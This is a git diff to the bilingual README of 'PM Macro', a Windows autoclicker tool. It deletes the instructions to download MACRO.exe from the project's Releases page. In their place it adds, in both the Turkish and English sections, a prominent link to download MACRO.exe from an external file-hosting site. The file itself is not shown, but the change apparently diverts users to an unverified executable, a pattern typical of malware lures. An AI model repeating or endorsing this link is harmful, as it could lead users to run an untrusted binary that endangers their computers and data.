@@ -16,6 +16,9 @@
 
 ## 🇹🇷 Türkçe
 
+
+İNDİRMEK İÇİN : https://www.mediafire.com/file/d72e37owj8xxepg/MACRO.exe/file
+
 ### Nedir?
 PM Macro, sol ve sağ tık için bağımsız CPS (saniyedeki tıklama) ayarı yapabileceğin hafif bir Windows makro aracıdır. Kurulum gerektirmez, tek dosyadır.
 
@@ -35,13 +38,12 @@ PM Macro, sol ve sağ tık için bağımsız CPS (saniyedeki tıklama) ayarı ya
 | `F7` | Sağ tık toggle |
 | `F8` | Tümünü durdur / başlat |
 
-### Kurulum
-1. [Releases](../../releases) sayfasından `MACRO.exe` indir
-2. Çalıştır — kurulum yok
 
 ---
 
 ## 🇬🇧 English
+
+FOR DOWNLOAD: https://www.mediafire.com/file/d72e37owj8xxepg/MACRO.exe/file
 
 ### What is it?
 PM Macro is a lightweight Windows mouse macro tool that lets you set independent CPS (clicks per second) for left and right mouse buttons. No installation required, single file.
